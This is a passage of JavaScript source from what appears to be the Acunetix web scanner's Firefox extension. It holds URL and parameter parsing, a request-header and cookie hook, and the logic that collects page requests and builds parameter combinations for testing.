						.QueryInterface(Components.interfaces.nsIURL);
		
		if(url.boolIsRElative)
		{
			if(url.strFileName != "") this.strFileName	= url.strFileName;
			this.strQuery		= url.strQuery;
			this.strParam		= url.strParam;
			this.strRef			= url.strRef;
			
			if((url.strDirectory == "") || (url.strDirectory[0] != '/'))
			{
				strSpec = "http://" + this.strHost + this.strDirectory + url.strDirectory;
			}
			else
			{
				strSpec = "http://" + this.strHost + url.strDirectory;
			}
						
			nsiurl.spec = strSpec;
			this.strDirectory = nsiurl.directory;
		}
		else
		{
			this.ParseUrl(strUrl);
		}
	}
	
	function ParseUrl(strInputUrl)
	{
		this.boolIsRElative = true;
		this.strScheme		= ""
		this.strHost		= ""
		this.strPort		= ""
		this.strUsername	= ""
		this.strPassword	= ""
		this.strFileName	= ""
		this.strDirectory	= ""
		this.strQuery		= ""
		this.strParam		= ""
		this.strRef			= ""
		
       
		if ((strInputUrl == null) || (strInputUrl == ""))
			return;
        
        //make sure we have a string type
		var strUrl = new String();
		strUrl = strInputUrl + ""; 
        
        //trim the imput
        strUrl = strUrl.replace(/^\s*(\S*(\s+\S+)*)\s*$/, "$1");
        
        //detect if this is javascript action
        var regexp = /^\s*javascript:.*?/i;
        if(regexp.exec(strUrl))
            return;
				
		var url 	= Components.classes["@mozilla.org/network/standard-url;1"]
						.createInstance(Components.interfaces.nsIStandardURL)
						.QueryInterface(Components.interfaces.nsIURL);

		
		regexp = /(^\/\/+)|(^[a-z,A-Z]+:\/\/+)/
		
		if(regexp.exec(strUrl))
		{
			this.boolIsRElative 	= false;
			
			url.spec 				= strUrl;
			this.strFileName 		= url.fileName;
			this.strQuery			= url.query;
			this.strParam			= url.param;
			this.strRef				= url.ref;
					
			this.strScheme			= url.scheme;
			this.strHost 			= url.host;
			if(url.port < 0 ) this.strPort = ""; else this.strPort = url.port + "";
			this.strUsername 		= url.username;
			this.strPassword 		= url.password;
			this.strDirectory		= url.directory;
			
		}
		else
		{
			url.spec 				= "http://ttt.com/" + strUrl;
			this.strFileName 		= url.fileName;
			this.strQuery			= url.query;
			this.strParam			= url.param;
			this.strRef				= url.ref;
			
			this.boolIsRElative		= true;
			
			this.strScheme			= "";
			this.strHost 			= "";
			this.strPort 			= "";
			this.strUsername 		= "";
			this.strPassword 		= "";
			
			var lastIndex 			= strUrl.search(/\?|\#|;|$/);
			lastIndex = lastIndex - this.strFileName.length;
			this.strDirectory		= strUrl.substring(0,lastIndex);
		}	
	}
}

VM894:10 /*
Author:		Attila Gerendi
Purpose:	The classParameterList class
*/

function classParameterList(strParameterList, strParameterSeparator, strEqualSign)
{
    strParameterList            = (strParameterList == null)		? ""  : strParameterList;
    this.strEqualSign           = (strEqualSign == null)			? "=" : strEqualSign;
    this.strParameterSeparator  = (strParameterSeparator == null)	? "&" : strParameterSeparator;
    
    this.arrayParameters = new Array();
    if (strParameterList != "")
        this.arrayParameters = strParameterList.split(this.strParameterSeparator);
}

classParameterList.prototype.GetParameterName = function(intIndex)
{
    if( intIndex >= this.arrayParameters.length)
        return("");
    var param = this.arrayParameters[intIndex].split(this.strEqualSign,2);
    return(param[0]);
}

classParameterList.prototype.GetParameterValue = function(intIndex)
{
    if( intIndex >= this.arrayParameters.length)
        return("");
    var param = this.arrayParameters[intIndex].split(this.strEqualSign,2);
    return(param[1]);
}

classParameterList.prototype.toString = function()
{
	if(this.arrayParameters.length == 0)
		return("");
    return(this.arrayParameters.join(this.strParameterSeparator));
}

classParameterList.prototype.clear = function()
{
    this.arrayParameters = new Array();   
}

classParameterList.prototype.removeParameter = function (strParamName)
{
    for(var i = 0; i < this.arrayParameters.length; i++)
    {
        var param = this.arrayParameters[i].split(this.strEqualSign, 2);
        if (param[0] == strParamName)
        {
            this.arrayParameters.splice(i);
            this.removeParameter(strParamName);
            return;
        }
    }
}

classParameterList.prototype.addParameterPair = function (strparamPair, boolRemovePrevious)
{
	if(strparamPair == "")
		return;
    var param = strparamPair.split(this.strEqualSign, 2);
    this.addParameter(param[0],param[1],boolRemovePrevious);
}

classParameterList.prototype.addParameter = function (strParamName, strParamValue, boolRemovePrevious)
{
    boolRemovePrevious = (boolRemovePrevious == null) ? false : boolRemovePrevious;
	if (strParamName == "")
	{
		if (strParamValue != "")
			this.arrayParameters.push(strParamValue);
		return;
	}
	
    if(boolRemovePrevious)
        this.removeParameter(strParamName);
	
	if (strParamValue != "")
		this.arrayParameters.push(strParamName + this.strEqualSign + strParamValue); //unescape(strParamValue));
	else
		this.arrayParameters.push(strParamName + this.strEqualSign);
}

classParameterList.prototype.AddParametersFromParamString = function (strParameterString, boolRemovePrevious)
{
    var params = strParameterString.split(this.strParameterSeparator);
    for( var i = 0 ; i < params.length ; i++)
        this.addParameterPair(params[i],boolRemovePrevious);     
}

classParameterList.prototype.createCopy = function()
{
	var obj                     = new classParameterList();
    obj.strEqualSign            = this.strEqualSign;
    obj.strParameterSeparator   = this.strParameterSeparator;
    obj.arrayParameters         = this.arrayParameters.slice();
    return(obj)
}


VM894:11 /*
Author:		Attila Gerendi
Purpose:	The classXMLHTTPRequestHook
*/

function classXMLHTTPRequestHook(aXMLHttpRequest, objCookie, objHeaders, intRedirectionLimit, boolDeleteOriginalCookie, boolDeleteOriginalHeaders)
{
	
	this.objCookie = (objCookie == null) ? null : objCookie;
    this.objHeaders = (objHeaders == null) ? null : objHeaders;
    
    this.intRedirectionLimit = (intRedirectionLimit == null) ? 20 : intRedirectionLimit;
	this.boolDeleteOriginalCookie = (boolDeleteOriginalCookie == null) ? false : boolDeleteOriginalCookie;
    this.boolDeleteOriginalHeaders = (boolDeleteOriginalHeaders == null) ? false : boolDeleteOriginalHeaders;
    
    this.XMLHttpRequest = aXMLHttpRequest;
    
    this.channel_ = aXMLHttpRequest.channel;
    // happens after the cookie data has been loaded into the request but before the request is sent
    this.topic_ = "http-on-modify-request";
    this.observerService_ = Components.classes["@mozilla.org/observer-service;1"].getService(Components.interfaces.nsIObserverService);
    this.observerService_.addObserver(this, this.topic_, false /* hold a strong reference */);
    this.lifeTime = new Scheduler(this.die, 15000); 
}

classXMLHTTPRequestHook.prototype.QueryInterface = function(iid)
{
    if (   iid.equals(Components.interfaces.nsISupports) || iid.equals(Components.interfaces.nsIObserver))
        return this;
    throw Components.results.NS_ERROR_NO_INTERFACE;
}

classXMLHTTPRequestHook.prototype.observe = function(subject, topic, data)
{
    if (topic != this.topic_ || subject != this.channel_)
        return;
    
	this.channel_.QueryInterface(Components.interfaces.nsIHttpChannel);
    
    this.channel_.redirectionLimit = this.intRedirectionLimit;
	this.intRedirectionLimit--;
    
    if (this.boolDeleteOriginalCookie)
            this.channel_.setRequestHeader("Cookie", "", false);
	
    if(this.objCookie != null)
    {
        this.channel_.setRequestHeader("Cookie", this.objCookie.toString(), true);
    }
            
    if(this.boolDeleteOriginalHeaders)
    {
        var visitor = {value : new Array(), visitHeader: function(a,b) { this.value.push(a);}};
        this.channel_.visitRequestHeaders(visitor);
        for(var i = 0 ; i< visitor.value.length; i++)
        {
            if(visitor.value[i].toLowerCase == "cookie")
                continue;
            this.channel_.setRequestHeader(visitor.value[i],"",false);
        }                
    }
    
    if(this.objHeaders != null)
    {
        for(var i = 0; i < this.objHeaders.arrayParameters.length; i++)
            this.channel_.setRequestHeader(this.objHeaders.GetParameterName(i), this.objHeaders.GetParameterValue(i), false);
    }
        
    visitor = {value : new String(), visitHeader: function(a,b) { this.value = this.value + a + ': ' + b + '\r\n';}};
    this.channel_.visitRequestHeaders(visitor);
    this.XMLHttpRequest.strRequestHeaders = visitor.value;
			
    this.lifeTime.stop();
    this.die();
}

classXMLHTTPRequestHook.prototype.die = function()
{
    this.observerService_.removeObserver(this, this.topic_); // avoid memory leaks
    delete(this.channel_);
    delete(this.lunchTime_);
    delete(this.observerService_);
}

/*
    A scheduler for executing a function (callback) after a specified amount of time.
    First parameter:    function variable, executing on every beat
    Second parameter:   time (in ms) after which the supplied function is called
*/
function Scheduler(callback, callAfter_MS)
{
    this.callback_ = callback;

    // get a timer
    this.timer_ = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);

    // we want to stop the beat on shutdown
    var observerService = Components.classes["@mozilla.org/observer-service;1"].getService(Components.interfaces.nsIObserverService);
    observerService.addObserver(this, "xpcom-shutdown", false);

    // initialize the timer to fire after the given ms interval
    this.timer_.initWithCallback(this, callAfter_MS, this.timer_.TYPE_ONE_SHOT);
}


Scheduler.prototype.QueryInterface = function(iid)
{
    if (   iid.equals(Components.interfaces.nsISupports)
        || iid.equals(Components.interfaces.nsITimerCallback)
        || iid.equals(Components.interfaces.nsIObserver))
        return this;
    throw Components.results.NS_ERROR_NO_INTERFACE;
}

Scheduler.prototype.observe = function(aSubject, aTopic, aData)
{
    // stop the beat on shutdown (see http://wiki.mozilla.org/XPCOM_Shutdown)
    if (aTopic == "xpcom-shutdown")
        this.stop();
}

Scheduler.prototype.stop = function()
{
    if (this.timer_) {
        // stop the timebeat and remove the observer
        this.timer_.cancel();
        this.timer_ = null;
        this.callback_ = null;
        var observerService = Components.classes["@mozilla.org/observer-service;1"].getService(Components.interfaces.nsIObserverService);
        observerService.removeObserver(this, "xpcom-shutdown");
    }
}

Scheduler.prototype.notify = function(aTimer)
{
    this.callback_();
    this.stop();
}
VM894:12 /*
Author:		Attila Gerendi
Purpose:	The classRequestColection, this class implements the request collection from the tested page
*/

function classRequestColection()
{
	this.arrayRequests = new Array();

	this.getRequestParameterWithGivenId = function(intID)
	{
		var requestParam = null;
		for(var i = 0; i < acunetixwebscanner.objRequestCollection.arrayRequests.length; i++)
		{
			requestParam = acunetixwebscanner.objRequestCollection.arrayRequests[i].getParameterWithGivenID(intID);
			if (requestParam != null) 
				break;
		}
		return(requestParam)
	}
	
	this.saveRequest = function(objRequest)
	{
		if(! acunetixwebscanner.objMozPrefs.getBoolPref("boolExcludeEquivalentRequest"))
		{
			this.arrayRequests.push(objRequest);
			return(true);
		}
		
		for(var i = 0 ; i < this.arrayRequests.length ; i++)
		{
			if (this.arrayRequests[i].compareWith(objRequest) == "equivalent")
			{
				//todo: maybe I can put a new options here instead compressing parameters
				if(acunetixwebscanner.objMozPrefs.getBoolPref("boolEnableAllCombination"))
				{
					for(var j = 0; j < objRequest.arrayParameters.length; j++)
					{
						var index = this.arrayRequests[i].haveRequestParameter(objRequest.arrayParameters[j]);
						if(index >= 0)
							this.arrayRequests[i].arrayParameters[index].compactParameters(objRequest.arrayParameters[j]);
					}
				}
				return(false);
			}
		}
		this.arrayRequests.push(objRequest);
		return(true);
	}

	this.extractRequestCollectionFromPage = function(objPageDocument, objOriginalPageDocument)
	{
		logToFile("classRequestColection/extractRequestCollectionFromPage");
		
		if (objOriginalPageDocument == null) //first entry so we have to save the original pageDocument
			objOriginalPageDocument = objPageDocument;
		
		var frames = objPageDocument.getElementsByTagName("frame");
		for (var i = 0; i < frames.length; i++) 
			this.extractRequestCollectionFromPage(frames[i].contentDocument, objOriginalPageDocument);
			
		var frames = objPageDocument.getElementsByTagName("iframe");
		for (var i = 0; i < frames.length; i++) 
			this.extractRequestCollectionFromPage(frames[i].contentDocument, objOriginalPageDocument);

		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractForms"))
		{
			var elements = objPageDocument.getElementsByTagName("form");		
			for (var i = 0; i < elements.length; i++) 
			{
				var request = new classRequestContainer(objPageDocument, objOriginalPageDocument);
				request.feedContainerFromForm(elements[i]);
				if (request.arrayParameters.length > 0)
					this.saveRequest(request);
			}
		}

		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractAnchors"))
		{
			var elements = objPageDocument.getElementsByTagName("a");
			for (var i = 0; i < elements.length; i++) 
			{
				var request = new classRequestContainer(objPageDocument, objOriginalPageDocument);
				request.feedContainerFromElementWithReference(elements[i],"href","a");
				if (request.arrayParameters.length > 0)
					this.saveRequest(request);
			}
		}
		
		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractImages"))
		{
			var elements = objPageDocument.getElementsByTagName("img");
			for (var i = 0; i < elements.length; i++) 
			{
				var request = new classRequestContainer(objPageDocument, objOriginalPageDocument);
				request.feedContainerFromElementWithReference(elements[i],"src","img");
				if (request.arrayParameters.length > 0)
					this.saveRequest(request);
			}
		}

		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractScripts"))
		{
			var elements = objPageDocument.getElementsByTagName("script");
			for (var i = 0; i < elements.length; i++) 
			{
				var request = new classRequestContainer(objPageDocument, objOriginalPageDocument);
				request.feedContainerFromElementWithReference(elements[i],"src","script");
				if (request.arrayParameters.length > 0)
					this.saveRequest(request);
			}
		}
	}	
	
	this.deleteChildNodes = function(container)
	{
		var tmpElem, elem = container.firstChild;
		while(elem)
		{
			tmpElem = elem;
			elem = elem.nextSibling;
			if (tmpElem.nodeName == "groupbox")
				container.removeChild(tmpElem);
		}
	}

	this.getRequestWithGivenID = function(strId)
	{
		for( i = 0; i < this.arrayRequests.length; i++)
			if(this.arrayRequests[i].strId == strId)
				return(this.arrayRequests[i]);
		return(null);
	}
	
	this.renderRequest = function(container,items)
	{
		items = (items == null) ? this.arrayRequests : items;
		var i, retval;
		this.deleteChildNodes(container);
		var requestBoxes = container.getElementBy
		for(i = 0; i < items.length; i++)
		{
			retval = items[i].render();
			if (retval != "")
				addXULElementsChildsFromString(container,retval);
		}
	}
}
VM894:13 /*
Author:		Attila Gerendi
Purpose:	The classRequestContainer, this class implements the request
*/

function classRequestContainer(objPageDocument, objOriginalPageDocument) 
{
	this.arrayParameters		= new Array();
	this.strId					= new String();
	this.strName				= new String();
	this.strRequestMethod		= new String();
	this.strRequestOrigin		= "";
	this.objPageDocument		= objPageDocument;
	this.arrayTestResults		= new Array();
	this.arrayOfGeneratedTestCombinations			= new Array();
	this.intCombination			= 0;
	this.intSubCombination		= 0;

	this.objAction				= new classUrlParser();
	this.strDocumentLocation	= objPageDocument.location;
	
	if(objOriginalPageDocument == null) objOriginalPageDocument = objPageDocument;
	
	this.strOriginalLocation	= objOriginalPageDocument.location;

	this.objRequestCombinations = new classCombinationGenerator();

		
	this.extractCookieParams = function()
	{
		if (this.objPageDocument.cookie == "")
			return;
		var arrayCookies = this.objPageDocument.cookie.split(';');
		for(var i = 0; i < arrayCookies.length; i++)
		{
			var cookie = arrayCookies[i].split('=',2);
			if (cookie.length < 2) cookie.push('');
			
			var objReqParam 			= new classRequestParameter();
			objReqParam.strId			= getElementIDOrGenerateOne();
			objReqParam.intID			= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strName			= cookie[0].replace(/^\s+|\s+$/g,"");
			objReqParam.strType			= "cookie";
			objReqParam.strRequestType	= "COOKIE";
			objReqParam.arrayUserSelectedValues.push(cookie[1].replace(/^\s+|\s+$/g,""));
			objReqParam.arraySelectableValues.push(cookie[1].replace(/^\s+|\s+$/g,""));
			objReqParam.boolMultipleSelectionControll	= false;
			objReqParam.boolSendParameter				= true;
			this.addNewRequestParrameter(objReqParam);
		}
	}
	
	this.insertHeadeVariables = function()
	{
		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractUserAgent"))
		{
			objReqParam 				 			= new classRequestParameter();
			objReqParam.strId 		 				= getElementIDOrGenerateOne();
			objReqParam.intID						= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strType 		 			= "header";
			objReqParam.strRequestType 				= "HEADERS";
			objReqParam.boolMultipleSelectionControll = false;
			objReqParam.boolSendParameter 			= true;
			objReqParam.strName 		 			= "User-Agent";
			objReqParam.arrayUserSelectedValues.push("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4");
			objReqParam.arraySelectableValues.push("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4");
			this.addNewRequestParrameter(objReqParam);
		}
		
		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractReferer"))
		{
			objReqParam 				 				= new classRequestParameter();
			objReqParam.strId 		 					= getElementIDOrGenerateOne();
			objReqParam.intID							= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strType 		 				= "header";
			objReqParam.strRequestType 					= "HEADERS";
			objReqParam.boolMultipleSelectionControll = false;
			objReqParam.boolSendParameter 				= true;
			objReqParam.strName 		 				= "Referer";
			objReqParam.arrayUserSelectedValues.push(this.objPageDocument.referrer);
			objReqParam.arraySelectableValues.push(this.objPageDocument.referrer);
			this.addNewRequestParrameter(objReqParam);
		}
	}

	this.refreshParametersData = function()
	{
		for(var i = 0 ; i < this.arrayParameters.length; i++)
			this.readParameterData(i);    
	}
	
	this.readParameterData = function(intParamIndex)
	{
		var element = objPageDocument.getElementById(this.arrayParameters[intParamIndex].strId);
		if (element == null)
			return;
			
		//microsoft stuff
		if(this.arrayParameters[intParamIndex].strType == 'hidden')
		{
			if(	(this.arrayParameters[intParamIndex].strName == '__EVENTTARGET') ||
				(this.arrayParameters[intParamIndex].strName == '__EVENTARGUMENT') ||
				(this.arrayParameters[intParamIndex].strName == '__VIEWSTATE') ||
				(this.arrayParameters[intParamIndex].strName == '__EVENTVALIDATION') )
				this.arrayParameters[intParamIndex].intEscapeMethod = 1;
		}
			
		switch(this.arrayParameters[intParamIndex].strType)
		{
			case "text": case "password": case "hidden": case "readonly": case "submit":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues		= new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues	= new Array();
				this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(element.value);
				this.arrayParameters[intParamIndex].arraySelectableValues.push(element.value);
			break;
			case "checkbox":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues		= new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues	= new Array();
				if(element.checked)
					this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(element.value);				
				this.arrayParameters[intParamIndex].arraySelectableValues.push(element.value);
				this.arrayParameters[intParamIndex].boolSendParameter		= element.checked;
			break;
			case "radio":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues = new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues = new Array();
				var formElement = objPageDocument.getElementById(this.strId);
				if (formElement == null)
					break;
				var elements = formElement.getElementsByTagName("input");
				for(var i = 0; i < elements.length ; i++)
				{
					if(!elements[i].hasAttribute("name")) continue;
					if( elements[i].getAttribute("name") != this.arrayParameters[intParamIndex].strName) continue;
					if(!elements[i].hasAttribute("type")) continue;
					if( elements[i].getAttribute("type").toLowerCase() != "radio") continue;
					if( elements[i].checked)
					{
						this.arrayParameters[intParamIndex].arrayUserSelectedValues = new Array();
						this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(elements[i].value);
					}
					this.arrayParameters[intParamIndex].arraySelectableValues.push(elements[i].value);                   
				}
			break;
			case "textarea":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues		= new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues	= new Array();
				this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(element.value);
				this.arrayParameters[intParamIndex].arraySelectableValues.push(element.value);
			break;
			case "button":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues		= new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues	= new Array();
				this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(element.value);
				this.arrayParameters[intParamIndex].arraySelectableValues.push(element.value);
			break;
			case "select":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues		= new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues	= new Array();
				var optionElements 	= element.getElementsByTagName("option");
				for(var i = 0; i < optionElements.length; i++)
				{
					if (optionElements[i].selected)
						this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(optionElements[i].value);
					this.arrayParameters[intParamIndex].arraySelectableValues.push(optionElements[i].value);
				}
			break;
			case "cookie":
				this.arrayParameters[intParamIndex].arrayUserSelectedValues = new Array();
				this.arrayParameters[intParamIndex].arraySelectableValues = new Array();
				arrayCookies = this.objPageDocument.cookie.split(';');
				for(var i = 0; i < arrayCookies.length; i++)
				{
					var cookie = arrayCookies[i].split('=',2);
					if (cookie.length < 2) cookie.push('');
					this.arrayParameters[intParamIndex].arrayUserSelectedValues.push(cookie[1].replace(/^\s+|\s+$/g,""));
					this.arrayParameters[intParamIndex].arraySelectableValues.push(cookie[1].replace(/^\s+|\s+$/g,""));	
				}
			break;
		}
	}

	this.getParameterWithGivenID = function(intID)
	{
		for(var i = 0; i < this.arrayParameters.length; i++)
			if(this.arrayParameters[i].intID == intID)
				return(this.arrayParameters[i]);
		return(null);
	}

	this.reduceArrayTestList = function(intIndexFrom, intTestIndex)
	{
		var i = intIndexFrom;
		while(i < this.arrayOfGeneratedTestCombinations.length)
		{
			if(this.arrayOfGeneratedTestCombinations[i].intTestedParameterIndex == intTestIndex)
			{
				this.arrayOfGeneratedTestCombinations.splice(i,1);
			}
			else
			{
				i++;
			}
		}
		return(this.arrayOfGeneratedTestCombinations.length);
	}
	
	this.generateParameterMannipulationCombinations = function()
	{
		logToFile("generateParameterMannipulationCombinations: Start");
		
		var arrayParameterCombinationDescriptor = new Array();
		var intCombNumber = 0;
		
		//boolIsSelectionForced is true if we have quick scan with extensive enabled
		var boolIsSelectionForced = acunetixwebscanner.objScanningProcessStatus.boolIsQuickScan && acunetixwebscanner.objMozPrefs.getBoolPref("boolEnableAllCombination");
		
		//this array contain the what combination value represent 0 - fixed( from user selected values), 1 - single index (from selectable values), 2 - index group (from selectable values)
		var arrayParameterCombinationType = new Array();
		for(var i = 0; i < this.arrayParameters.length; i++)
		{
			var intCombinationType = 0; //user selected
			
			if(this.arrayParameters[i].arraySelectableValues.length > 1)
			{
				if(this.arrayParameters[i].boolSelectionChangeable)
					intCombinationType = 1; //single index
				if(boolIsSelectionForced)
					intCombinationType = 1; //single index
			}
			
			if(this.arrayParameters[i].boolMultipleSelectionControll)
			{
				if(boolIsSelectionForced)
					intCombinationType = 2; //group index
				if(this.arrayParameters[i].boolSelectionChangeable)
					if(this.arrayParameters[i].boolAllowMultipleSelection)
						intCombinationType = 2; //group index
			}
			
			arrayParameterCombinationType.push(intCombinationType);
		}
		
		logToFile("generateParameterMannipulationCombinations = > 0 - fixed( from user selected values), 1 - single index (from selectable values), 2 - index group (from selectable values)", 2);
		logToFile(dumpObject(arrayParameterCombinationType,"arrayParameterCombinationType"), 2);
		
		//generating a list with minimum and maximum combination index per parameter
		for(var i = 0; i < this.arrayParameters.length; i++)
		{
			if(this.arrayParameters[i].boolSendParameter || acunetixwebscanner.objScanningProcessStatus.boolIsQuickScan)
			{
				if (arrayParameterCombinationType[i] == 2) //generate multiple selections
				{
						var objTmp			= new classMultipleSelectionCombinationGenerator();
						intCombNumber		= objTmp.getAllPossibbleCombinationsNumber(this.arrayParameters[i].arraySelectableValues.length);
						intCombNumber		= Math.min(acunetixwebscanner.objMozPrefs.getIntPref("intMaximumCombinationsGeneratedPerInput"),intCombNumber);
						arrayParameterCombinationDescriptor.push({intMinVal : 1, intMaxVal : intCombNumber});
						objTmp				= null; //free memory
				}
				if (arrayParameterCombinationType[i] == 1) //generate alternative selections
				{
					intCombNumber		= this.arrayParameters[i].arraySelectableValues.length;
					intCombNumber		= Math.min(acunetixwebscanner.objMozPrefs.getIntPref("intMaximumCombinationsGeneratedPerInput"),intCombNumber);
					arrayParameterCombinationDescriptor.push({intMinVal : 1, intMaxVal : intCombNumber});
				}
				if (arrayParameterCombinationType[i] == 0) //user selected index
				{
					intCombNumber = 1;
					arrayParameterCombinationDescriptor.push({intMinVal : 1, intMaxVal : intCombNumber});
				}
			}
			else
			{
				arrayParameterCombinationDescriptor.push({intMinVal : -1, intMaxVal : -1});
			}
		}
		
		logToFile("generateParameterMannipulationCombinations = minimum and maximum combination index per parameter", 2);
		logToFile(dumpObject(arrayParameterCombinationDescriptor,"arrayParameterCombinationDescriptor"), 2);
		
		//generate parameterCombinations		
		var arrayParameterCombinations = generateCombinationFromCombinationReferenceList(arrayParameterCombinationDescriptor);
		
		logToFile(dumpObject(arrayParameterCombinations,"arrayParameterCombinations"), 2);
		
		//reduce the parameterCombinations for testable combinations
		//this reduces combinations wich does not have any test enabled
		function reduceArrayParameterCombinations(arrayParameters)
		{
			for(var i = 0; i < arrayParameterCombinations.length; i++)
			{
				if(arrayParameterCombinations[i].length == 0)
				{
					// parameter combination length = 0 so there is nothing to test
					arrayParameterCombinations.splice(i,1);
					reduceArrayParameterCombinations(arrayParameters);
					return;
				}
				
				var boolTestable = false;
				
				for(var j = 0; j < arrayParameterCombinations[i].length; j++)
				{
					if( arrayParameterCombinations[i][j] >= 0)
					{
						if(arrayParameters[j].boolApplyTestPaterns) //this one is testable
						{
							boolTestable = true;
							break;
						}
						if(acunetixwebscanner.objScanningProcessStatus.boolIsQuickScan) //this one is testable
						{
							boolTestable = true;
							break;
						}
					}
				}
				if(!boolTestable)
				{ 	// no testable parameter found so we can reduce this one too
					arrayParameterCombinations.splice(i,1);
					reduceArrayParameterCombinations(arrayParameters);
					return;
				}
			}
		}
		
		reduceArrayParameterCombinations(this.arrayParameters);
		
		logToFile(dumpObject(arrayParameterCombinations,"Reduced ArrayParameterCombinations"), 2);
		
		//expand arrayParameterCombinations => there are combinations on parameter (multiple values per parameter)
		var arrayRequestDescriptor = new Array();
		
		for(var i = 0; i < arrayParameterCombinations.length; i++)
		{
			var requestDescriptor = new Array(); //[parameterIndex][valueIndex]
			
			for(var j = 0; j < arrayParameterCombinations[i].length; j++)
			{
				logToFile("Combination: " + i + ", Parameter index: " + j, 2);
				if(arrayParameterCombinations[i][j] < 0)	//this parameter will not be sent
					continue;
				
				switch (arrayParameterCombinationType[j])
				{
					case 0 :	//user selected
						logToFile("user selected", 2);
						var boolFound = false;
						for( var l = 0 ; l < this.arrayParameters[j].arrayUserSelectedValues.length; l++)
						{
							for(var k = 0; k < this.arrayParameters[j].arraySelectableValues.length; k++)
							{
								if(this.arrayParameters[j].arraySelectableValues[k] == this.arrayParameters[j].arrayUserSelectedValues[l])
								{
									requestDescriptor.push({param : j, index : k});
									boolFound = true;
									break;
								}
							}
							// even if we do not have user selected value (eg. for combo boxes) but the parameter is marked to be tested the we will introduce a test value anyway
							if((!boolFound) && (this.arrayParameters[j].boolApplyTestPaterns || acunetixwebscanner.objScanningProcessStatus.boolIsQuickScan))
								requestDescriptor.push({param : j, index : 0});
						}
						break;
					case 1 :	//single fixed index
						logToFile("single fixed index", 2);
						requestDescriptor.push( {param : j, index : arrayParameterCombinations[i][j]});
						break;
					case 2 :	// multiple selection
						logToFile("multiple selection", 2);
						var objMS = new classMultipleSelectionCombinationGenerator();
						var arrayCombination = objMS.getCombinationByIndex(this.arrayParameters[j].arraySelectableValues.length, arrayParameterCombinations[i][j]);
						for( var l = 0 ; l < arrayCombination.length; l++)
							requestDescriptor.push({param : j, index : arrayCombination[l]});
						break;
				}
			}
			arrayRequestDescriptor.push(requestDescriptor);
		}
		
		logToFile("Format: comb:x = {item:y ={param:z, index:w} } )", 2);
		logToFile(dumpObject(arrayRequestDescriptor,"expanded : arrayRequestDescriptor"), 2);
		
		//expand arrayRequestDescriptor to final test array
		this.arrayOfGeneratedTestCombinations	= new Array();
		for(var i = 0; i < arrayRequestDescriptor.length; i++)
		{
			for(var j = 0; j < arrayRequestDescriptor[i].length; j++)
			{
				logToFile("Comb: " + i + " item: " + j + " itemIndex: " + arrayRequestDescriptor[i][j].param + " apply: " + this.arrayParameters[arrayRequestDescriptor[i][j].param].boolApplyTestPaterns, 2);
				if(this.arrayParameters[arrayRequestDescriptor[i][j].param].boolApplyTestPaterns || acunetixwebscanner.objScanningProcessStatus.boolIsQuickScan)
					this.arrayOfGeneratedTestCombinations.push({arrayParameters: arrayRequestDescriptor[i], intTestedParameterIndex: arrayRequestDescriptor[i][j].param})
			}
		}
		logToFile(dumpObject(this.arrayOfGeneratedTestCombinations,"expanded : this.arrayOfGeneratedTestCombinations"), 2);
		return(this.arrayOfGeneratedTestCombinations.length);
	}

	// return true if parameter inserted
	this.addNewRequestParrameter = function(objRequestParameter)
	{
		var x = this.haveRequestParameter(objRequestParameter);
		if(x < 0)
		{
			this.arrayParameters.push(objRequestParameter);
			return(true);
		}		
		//todo: compact parameters
		return(false);
	}

	this.haveRequestParameter = function(objRequestParameter)
	{
		for(var i = 0; i < this.arrayParameters.length; i++)
			if(this.arrayParameters[i].isEquivalentWith(objRequestParameter))
				return(i)
		return(-1);
	}

	this.compareWith = function(objRequest)
	{	
		if(this.objAction.getURL().toLowerCase() != objRequest.objAction.getURL().toLowerCase())
			return("different");
		
		var boolAllobjParameterIncludedInThis = true;		
		for(var i = 0; i < objRequest.arrayParameters.length; i++)
		{
			if(this.haveRequestParameter(objRequest.arrayParameters[i]) < 0)
			{
				boolAllobjParameterIncludedInThis = false;
				break;
			}
		}
		
		var boolAllThisIncludedInObjParameter = true;	
		for(var i = 0; i < this.arrayParameters.length; i++)
		{
			if(objRequest.haveRequestParameter(this.arrayParameters[i]) < 0)
			{
				boolAllThisIncludedInObjParameter = false;
				break;
			}
		}
		
		if(boolAllThisIncludedInObjParameter && boolAllobjParameterIncludedInThis) return ("equivalent");
		if(boolAllThisIncludedInObjParameter && (!boolAllobjParameterIncludedInThis) ) return ("included");
		if(boolAllobjParameterIncludedInThis && (!boolAllThisIncludedInObjParameter) ) return ("contain");
		return("different");
	}
		
	
	
	this.getParamsFromURLParser = function(objUrlparser)
	{
		var objQuery = new classParameterList(objUrlparser.strQuery);
		
		for(var i = 0; i < objQuery.arrayParameters.length; i++ )
		{
			if(objQuery.GetParameterName(i) == '') continue;
			
